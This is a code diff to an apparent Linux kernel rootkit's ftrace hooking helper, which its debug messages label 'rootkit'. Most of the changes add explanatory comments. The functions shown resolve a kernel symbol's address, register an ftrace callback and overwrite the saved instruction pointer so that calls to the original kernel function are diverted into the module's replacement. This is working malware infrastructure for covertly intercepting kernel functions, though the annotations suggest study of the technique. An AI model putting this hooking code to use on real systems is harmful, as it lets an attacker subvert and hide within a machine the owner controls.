@@ -96,15 +96,19 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
 }
 
 /* See comment below within fh_install_hook() */
+/* prepare the hook ftrace_ops function(the function that is called when registering the hook)
+   to set the rip(instruction pointer) reg to the function we want to replace the original with to prevent recall and recursion.
+   the notrace macro is to set function as non-traceable when tracing is enabled*/
 static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
 {
+	/* make a container to the hook to get its function to change to
+	https://radek.io/2012/11/10/magical-container_of-macro/ */
 	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
-
 #if USE_FENTRY_OFFSET
 	regs->ip = (unsigned long) hook->function;
 #else
-	if(!within_module(parent_ip, THIS_MODULE))
-		regs->ip = (unsigned long) hook->function;
+	if(!within_module(parent_ip, THIS_MODULE)) // check that the called ftrace is called from the lkm
+		regs->ip = (unsigned long) hook->function; // modify the rip reg to point to our function to set it later to be traced and recurse protected
 #endif
 }
 
@@ -117,7 +121,7 @@ static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, s
 int fh_install_hook(struct ftrace_hook *hook)
 {
 	int err;
-	err = fh_resolve_hook_address(hook);
+	err = fh_resolve_hook_address(hook); // get the original address of the function we want to hook
 	if(err){
 		return err;
 	}
@@ -133,14 +137,37 @@ int fh_install_hook(struct ftrace_hook *hook)
 			| FTRACE_OPS_FL_RECURSION
 			| FTRACE_OPS_FL_IPMODIFY;
 
-	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+
+	/*
+	 * ftrace_set_filter_ip - set a function to filter on in ftrace by address
+	 * @ops - the ops to set the filter with
+	 * @ip - the address to add to or remove from the filter.
+	 * @remove - non zero to remove the ip from the filter
+	 * @reset - non zero to reset all filters before applying this filter.
+	 *
+	 * Filters denote which functions should be enabled when tracing is enabled
+	 * If @ip is NULL, it failes to update filter.
+	 */
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0); // prepare the function to be traced by its address by setting a filter on the address with ops
 	if(err)
 	{
 		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
 		return err;
 	}
 
-	err = register_ftrace_function(&hook->ops);
+	/**
+ 	* register_ftrace_function - register a function for profiling
+ 	* @ops - ops structure that holds the function for profiling.
+ 	*
+ 	* Register a function to be called by all functions in the
+ 	* kernel.
+ 	*
+ 	* Note: @ops->func and all the functions it calls must be labeled
+ 	*       with "notrace", otherwise it will go into a
+ 	*       recursive loop.
+ 	*/
+	err = register_ftrace_function(&hook->ops); // start tracing the hook and set the callback function to the one specified in the hook->ops.func and apply to the filter
+												// locking ftracing mutex to start changes and then unlocking it
 	if(err)
 	{
 		printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
@@ -166,16 +193,16 @@ void fh_remove_hook(struct ftrace_hook *hook)
 		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
 	}
 
-	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0); // remove the address from ftrace filter
 	if(err)
 	{
 		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
 	}
 }
 
-/* To make it easier to hook multiple functions in one module, this provides
- * a simple loop over an array of ftrace_hook struct
- * */
+/* To hook a specifiec function we iterate over the hooks array
+ * and then call the fh_install_hook on the function
+ */
 int activate_hook(struct ftrace_hook *hooks, size_t count, char *symbol)
 {
 	int err;
